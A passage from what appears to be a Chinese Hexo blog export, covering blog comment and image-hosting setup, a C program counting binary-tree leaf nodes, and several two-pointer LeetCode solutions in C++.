class="comment">#之后创建新的博客文章时在其最上面添加 tags: -名称 即可</span></span><br></pre></td></tr></table></figure>

<h2 id="3-3-评论"><a href="#3-3-评论" class="headerlink" title="3.3 评论"></a>3.3 评论</h2><p><strong>主题配置中修改：type 类型</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 评论</span><br><span class="line">comments:</span><br><span class="line">  enable: true</span><br><span class="line">  # 使用哪种评论插件[&quot;gitment&quot;, &quot;valine&quot;]</span><br><span class="line">  type: </span><br></pre></td></tr></table></figure>

<p><strong>gitment ：根目录配置文件中增加</strong></p>
<p><a href="https://github.com/settings/applications/new">gitment 注册页面</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">comments:</span><br><span class="line">  gitment:</span><br><span class="line">    enable: true</span><br><span class="line">    mint: true</span><br><span class="line">    count: true</span><br><span class="line">    lazy: true</span><br><span class="line">    cleanly: true</span><br><span class="line">    language:</span><br><span class="line">    github_user: </span><br><span class="line">    github_repo: </span><br><span class="line">    client_id: </span><br><span class="line">    client_serect: </span><br></pre></td></tr></table></figure>

<p><strong>valine：根目录配置文件中增加</strong></p>
<p><a href="https://www.leancloud.cn/">valine 注册页面</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">comments:</span><br><span class="line">  valine:</span><br><span class="line">    enable: true</span><br><span class="line">    appid: </span><br><span class="line">    appkey: </span><br><span class="line">    notify: false</span><br><span class="line">    verity: false</span><br><span class="line">    placeholder: 留下你美好的足迹叭^-^!</span><br><span class="line">    guest_info: nink,mail</span><br><span class="line">    pageSize: 10</span><br></pre></td></tr></table></figure>

<h2 id="3-4-图床"><a href="#3-4-图床" class="headerlink" title="3.4 图床"></a>3.4 图床</h2><ul>
<li><p>腾讯云注册、创建对象存储 <a href="https://blog.csdn.net/qq_40672635/article/details/105904918?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522162193173316780264070887%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=162193173316780264070887&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-1-105904918.pc_search_result_cache&utm_term=%E8%85%BE%E8%AE%AF%E4%BA%91PICgo&spm=1018.2226.3001.4187">参考链接</a></p>
</li>
<li><p>获取密钥 <a href="https://console.cloud.tencent.com/cam/capi">地址</a></p>
</li>
<li><p>COSBrowser <a href="https://cloud.tencent.com/document/product/436/40762">官方文档</a></p>
</li>
<li><p>下载 PicGo  <a href="https://github.com/Molunerfinn/PicGo/releases">下载地址</a> </p>
</li>
<li><p>使用 <strong>腾讯云 + Typora +  PicGo</strong>  :</p>
<p>文件— 偏好设置，如下图进行配置</p>
<p><img src="https://i.loli.net/2021/05/25/Z1ArJXndGR9fsHW.png"></p>
<p>对于 PicGo ，配置如下</p>
<p><img src="https://i.loli.net/2021/05/25/CDi4mFZodyux3AJ.png" alt="image-20210525165424121"></p>
<p>最后点击上方的验证图片上传选项即可检验</p>
</li>
<li><p>第二种配置</p>
<p><img src="https://i.loli.net/2021/05/25/7VNB8QnXUtwvklP.png" alt="image-20210525171054377"></p>
<p>点击下载或更新</p>
<p>访问下面链接，注册账号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://sm.ms/home/apitoken</span><br></pre></td></tr></table></figure>

<p>然后访问下面链接</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://sm.ms/home/apitoken</span><br></pre></td></tr></table></figure>

<p>点击生成Token</p>
<p><img src="https://i.loli.net/2021/05/25/4clAgqx5w3YDrbt.png" alt="image-20210525171309143"></p>
<p>然后点击Typora中的打开配置文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;picBed&quot;: &#123;</span><br><span class="line">    &quot;uploader&quot;: &quot;smms&quot;,</span><br><span class="line">    &quot;smms&quot;: &#123;</span><br><span class="line">      &quot;token&quot;: &quot;你上个页面的申请的token&quot; </span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;picgoPlugins&quot;: &#123;&#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>写入Token，保存</p>
<p>最后 验证图片上传选项进行验证 即可</p>
</li>
</ul>
<h1 id="四、参考链接"><a href="#四、参考链接" class="headerlink" title="四、参考链接"></a>四、参考链接</h1><p><a href="http://theme-next.iissnan.com/faqs.html#favicon">next 主题配置官方</a></p>
<p><a href="https://hexo.io/zh-cn/docs/configuration">hexo 官方使用文档</a></p>
<p><a href="https://www.jianshu.com/p/9d91355e8418">Github + PicGo 参考</a></p>
<p><a href="https://sunhwee.com/posts/6e8839eb.html#toc-heading-13">博客搭建全1</a></p>
<p><a href="https://blog.csdn.net/sinat_37781304/article/details/82729029?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522162175036716780262580342%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=162175036716780262580342&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-2-82729029.pc_search_result_no_baidu_js&utm_term=hexo+%E5%A2%9E%E5%8A%A0+comments&spm=1018.2226.3001.4187">HEXO 博客搭建全</a></p>
<p><a href="https://blog.csdn.net/nineya_com/article/details/103308963">https://blog.csdn.net/nineya_com/article/details/103308963</a></p>
<p><a href="https://github.com/iTimeTraveler/hexo-theme-hiker">hiker 主题界面设置</a></p>
<p><a href="https://www.bilibili.com/video/BV1cW411A7Jx?p=4">https://www.bilibili.com/video/BV1cW411A7Jx?p=4</a></p>
<p><a href="https://blog.csdn.net/jspnetcn/article/details/104111651?utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~default-5.baidujs">https://blog.csdn.net/jspnetcn/article/details/104111651?utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~default-5.baidujs</a></p>
]]></content>
      <categories>
        <category>博客部署</category>
      </categories>
      <tags>
        <tag>博客</tag>
        <tag>Hexo</tag>
        <tag>图床</tag>
      </tags>
  </entry>
  <entry>
    <title>二叉树_题</title>
    <url>/2021/11/06/%E4%BA%8C%E5%8F%89%E6%A0%91-%E9%A2%98/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h3 id="分别采用递归和非递归方式编写两个函数，求一颗给定二叉树中叶子结点的个数"><a href="#分别采用递归和非递归方式编写两个函数，求一颗给定二叉树中叶子结点的个数" class="headerlink" title="分别采用递归和非递归方式编写两个函数，求一颗给定二叉树中叶子结点的个数"></a>分别采用递归和非递归方式编写两个函数，求一颗给定二叉树中叶子结点的个数</h3><p><strong><code>bintree.h</code></strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 1000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">char</span> *a; </span><br><span class="line"><span class="comment">/* 如果在定义点之前的函数想引用该全局变量，则应该在引用之前用关键字 extern 对该变量作“外部变量声明”，表示该变量是一个已经定义的外部变量 */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//链式存储，不带双亲</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">    <span class="keyword">char</span> data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">lchild</span>,*<span class="title">rchild</span>;</span></span><br><span class="line">&#125;binnode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> binnode *bintree;</span><br><span class="line"></span><br><span class="line"><span class="comment">//二叉树的 创建</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">create</span><span class="params">(bintree *t)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> ch = *a++;</span><br><span class="line">    <span class="keyword">if</span>(ch == <span class="string">&#x27; &#x27;</span>)</span><br><span class="line">        *t = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        *t = (bintree)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(binnode));</span><br><span class="line">        (*t)-&gt;data = ch;</span><br><span class="line">        create(&amp;(*t)-&gt;lchild);</span><br><span class="line">        create(&amp;(*t)-&gt;rchild);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//前序 递归 遍历 二叉树</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">preorder</span><span class="params">(bintree t)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(t)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,t-&gt;data);</span><br><span class="line">        preorder(t-&gt;lchild);</span><br><span class="line">        preorder(t-&gt;rchild);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//顺序栈 定义</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    bintree data[N];</span><br><span class="line">    <span class="keyword">int</span> top;</span><br><span class="line">&#125;seqstack;</span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化 顺序栈</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">(seqstack *s)</span></span>&#123;</span><br><span class="line">    s-&gt;top = <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//判断栈是否为空</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">empty</span><span class="params">(seqstack *s)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(s-&gt;top &gt; <span class="number">-1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">//不为空</span></span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>; <span class="comment">//为空</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//判断栈是否 满</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">full</span><span class="params">(seqstack *s)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(s-&gt;top == N<span class="number">-1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;  <span class="comment">//满</span></span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;  <span class="comment">//不满</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//进栈</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">push</span><span class="params">(seqstack *s,bintree x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!full(s))</span><br><span class="line">        s-&gt;data[++s-&gt;top] = x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//出栈</span></span><br><span class="line"><span class="function">bintree <span class="title">pop</span><span class="params">(seqstack *s)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!empty(s))</span><br><span class="line">        <span class="keyword">return</span> s-&gt;data[s-&gt;top--];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong><code>333.cpp</code></strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;bintree.h&quot;</span></span></span><br><span class="line"><span class="keyword">char</span> *a = <span class="string">&quot;ABD  EF  G  C  &quot;</span>;   <span class="comment">//前序序列</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//递归方法求 二叉树 叶子结点的个数</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">lefts_1</span><span class="params">(bintree t)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(t == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(!t-&gt;lchild &amp;&amp; !t-&gt;rchild)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    	 <span class="keyword">else</span></span><br><span class="line">             <span class="keyword">return</span> lefts_1(t-&gt;lchild) + lefts_1(t-&gt;rchild);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//非递归方法 求 二叉树 叶子结点的 个数  (需要使用到顺序栈)</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">lefts_2</span><span class="params">(bintree t)</span></span>&#123;</span><br><span class="line">    seqstack s;</span><br><span class="line">    <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">    init(&amp;s);</span><br><span class="line">    <span class="keyword">while</span>(t || !empty(&amp;s))&#123;</span><br><span class="line">        <span class="keyword">if</span>(t)&#123;</span><br><span class="line">            <span class="keyword">if</span>(!t-&gt;lchild &amp;&amp; !t-&gt;rchild)</span><br><span class="line">                count++;</span><br><span class="line">            push(&amp;s,t);</span><br><span class="line">            t = t-&gt;lchild;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            t = pop(&amp;s);</span><br><span class="line">            t = t-&gt;rchild;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//测试</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    bintree t;</span><br><span class="line">    create(&amp;t);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;递归算法：二叉树叶子结点个数---%d\n&quot;</span>,lefts_1(t));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;非递归算法：二叉树叶子结点个数---%d\n&quot;</span>,lefts_2(t));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/10/30/SCeVzquhiojcy5A.png" alt="image-20211030165952310"></p>
<p>以上面的二叉树为例：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span> *a = <span class="string">&quot;ABD  EF  G  C  &quot;</span>;   <span class="comment">//前序序列</span></span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/11/06/cMHT2U5hE6zfgjO.png" alt="image-20211106112844209"></p>
]]></content>
      <categories>
        <category>数据结构</category>
      </categories>
  </entry>
  <entry>
    <title>二、双指针</title>
    <url>/2025/12/03/%E4%BA%8C%E3%80%81%E5%8F%8C%E6%8C%87%E9%92%88/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="、双指针"><a href="#、双指针" class="headerlink" title="、双指针"></a>、双指针</h2><ul>
<li>32是空格</li>
<li>48～57：0-9</li>
<li>65～90：A-Z</li>
<li>97～122：a-z 【差32】</li>
</ul>
<h3 id="1-有序数组的-Two-Sum"><a href="#1-有序数组的-Two-Sum" class="headerlink" title="1 有序数组的 Two Sum"></a>1 有序数组的 Two Sum</h3><p>在该数组中找出和为目标值的那两个整数，并返回他们的数组下标</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    双指针: 右上角 倒三角，每次排除一行或者一列空间</span></span><br><span class="line"><span class="comment">    搜索空间O(n)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">twoSum</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; numbers, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> j=numbers.<span class="built_in">size</span>()<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">while</span>(i&lt;j)&#123;</span><br><span class="line">            <span class="keyword">int</span> sum = numbers[i]+numbers[j];</span><br><span class="line">            <span class="keyword">if</span>(sum&lt;target)</span><br><span class="line">                i++;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(sum&gt;target)</span><br><span class="line">                j--;</span><br><span class="line">            <span class="keyword">else</span>   </span><br><span class="line">                <span class="keyword">return</span> vector&lt;<span class="keyword">int</span>&gt;&#123;i+<span class="number">1</span>,j+<span class="number">1</span>&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> vector&lt;<span class="keyword">int</span>&gt;&#123;<span class="number">-1</span>,<span class="number">-1</span>&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="633-平方数之和"><a href="#633-平方数之和" class="headerlink" title="633 平方数之和"></a>633 平方数之和</h3><p>给定一个非负整数 c ，你要判断是否存在两个整数 a 和 b，使得 a^2 + b^2 = c</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    sqrt()函数：开方</span></span><br><span class="line"><span class="comment">    O(根号c)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">judgeSquareSum</span><span class="params">(<span class="keyword">int</span> c)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">long</span> a=<span class="number">0</span>;a*a&lt;=c;a++)&#123;</span><br><span class="line">            <span class="keyword">double</span> b = <span class="built_in">sqrt</span>(c-a*a);</span><br><span class="line">            <span class="keyword">if</span>(b == (<span class="keyword">int</span>)b)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    双指针</span></span><br><span class="line"><span class="comment">     O(根号c)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">judgeSquareSum</span><span class="params">(<span class="keyword">int</span> c)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">long</span> left = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">long</span> right = (<span class="keyword">int</span>)<span class="built_in">sqrt</span>(c);</span><br><span class="line">        <span class="keyword">while</span>(left&lt;=right)&#123;</span><br><span class="line">            <span class="keyword">long</span> sum = left*left+right*right;</span><br><span class="line">            <span class="keyword">if</span>(sum==c)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(sum&gt;c)</span><br><span class="line">                right--;</span><br><span class="line">            <span class="keyword">else</span>   </span><br><span class="line">                left++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="345-反转字符串中的元音字母"><a href="#345-反转字符串中的元音字母" class="headerlink" title="345 反转字符串中的元音字母"></a>345 反转字符串中的元音字母</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    输入：s = &quot;leetcode&quot;</span></span><br><span class="line"><span class="comment">    输出：&quot;leotcede&quot;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">string <span class="title">reverseVowels</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">auto</span> isVowel = [vowels = <span class="string">&quot;aeiouAEIOU&quot;</span>s](<span class="keyword">char</span> ch) &#123;</span><br><span class="line">            <span class="keyword">return</span> vowels.<span class="built_in">find</span>(ch) != string::npos;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">int</span> n = s.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>, j = n - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (i &lt; j) &#123;</span><br><span class="line">            <span class="keyword">while</span> (i &lt; n &amp;&amp; !<span class="built_in">isVowel</span>(s[i])) &#123;</span><br><span class="line">                i++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span> (j &gt; <span class="number">0</span> &amp;&amp; !<span class="built_in">isVowel</span>(s[j])) &#123;</span><br><span class="line">                j--;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (i &lt; j) &#123;</span><br><span class="line">                <span class="built_in">swap</span>(s[i], s[j]);</span><br><span class="line">                i++;</span><br><span class="line">                j--;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="125-验证回文串"><a href="#125-验证回文串" class="headerlink" title="125 验证回文串"></a>125 验证回文串</h3><p><strong>回文串：</strong> 如果在将所有大写字符转换为小写字符、并移除所有非字母数字字符之后，短语正着读和反着读都一样。则可以认为该短语是一个。【回文串包括：字母，数字】</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    双指针</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isPalindrome</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        string str;</span><br><span class="line">        <span class="comment">//isalnum()是否全为字母或者数字[十进制]</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">char</span> ch:s)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">isalnum</span>(ch))&#123;</span><br><span class="line">                <span class="comment">//tolower()将字母字符转换为 小写</span></span><br><span class="line">                <span class="comment">//toupper()转大写</span></span><br><span class="line">                str += <span class="built_in">tolower</span>(ch);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> n=str.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">int</span> left=<span class="number">0</span>,right=n<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">while</span>(left&lt;right)&#123;</span><br><span class="line">            <span class="keyword">if</span>(str[left] != str[right])</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            left++;</span><br><span class="line">            right--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    原串上直接判断O(1)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isPalindrome</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = s.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">int</span> left = <span class="number">0</span>, right = n - <span class="number">1</span>;<span class="comment">//双指针</span></span><br><span class="line">        <span class="keyword">while</span> (left &lt; right) &#123;</span><br><span class="line">            <span class="keyword">while</span> (left &lt; right &amp;&amp; !<span class="built_in">isalnum</span>(s[left])) &#123;</span><br><span class="line">                ++left;<span class="comment">//非字母或者数字，跳过</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span> (left &lt; right &amp;&amp; !<span class="built_in">isalnum</span>(s[right])) &#123;</span><br><span class="line">                --right;<span class="comment">//非字母或者数字，跳过</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (left &lt; right) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">tolower</span>(s[left]) != <span class="built_in">tolower</span>(s[right])) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                ++left;</span><br><span class="line">                --right;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    字符串反转：反转之后与原串相同 则是回文串</span></span><br><span class="line"><span class="comment">    string str_reverse(str.rbegin(),str.rend());</span></span><br><span class="line"><span class="comment">    reverse(str.begin(),str.end());</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isPalindrome</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        string str;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">char</span> ch:s)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">isalnum</span>(ch))&#123;</span><br><span class="line">                str += <span class="built_in">tolower</span>(ch);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//字符串反转</span></span><br><span class="line">        <span class="function">string <span class="title">str_reverse</span><span class="params">(str.rbegin(),str.rend())</span></span>;</span><br><span class="line">        <span class="keyword">return</span> str==str_reverse;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="680-验证回文串-II"><a href="#680-验证回文串-II" class="headerlink" title="680 验证回文串 II"></a>680 验证回文串 II</h3><p>给你一个字符串 s，<strong>最多 可以从中删除一个字符</strong>。<br>请你判断 s 是否能成为回文字符串：如果能，返回 true ；否则，返回 false </p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    双指针</span></span><br><span class="line"><span class="comment">    return check(s,low,high-1)||check(s,low+1,high);</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">check</span><span class="params">(<span class="keyword">const</span> string &amp;s,<span class="keyword">int</span> low,<span class="keyword">int</span> high)</span></span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=low,j=high;i&lt;j;i++,j--)&#123;</span><br><span class="line">            <span class="keyword">if</span>(s[i]!=s[j])</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">validPalindrome</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> low=<span class="number">0</span>,high=s.<span class="built_in">size</span>()<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">while</span>(low&lt;high)&#123;</span><br><span class="line">            <span class="keyword">char</span> c1=s[low],c2=s[high];</span><br><span class="line">            <span class="keyword">if</span>(c1==c2)&#123;</span><br><span class="line">                low++;</span><br><span class="line">                high--;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">check</span>(s,low,high<span class="number">-1</span>)||<span class="built_in">check</span>(s,low+<span class="number">1</span>,high);<span class="comment">//减1 尝试</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="88-合并两个有序数组——升序"><a href="#88-合并两个有序数组——升序" class="headerlink" title="88 合并两个有序数组——升序"></a>88 合并两个有序数组——升序</h3><p>合并两个 <strong>升序</strong> 数组，最后放于 num1数组中，其初始长度是m+n</p>
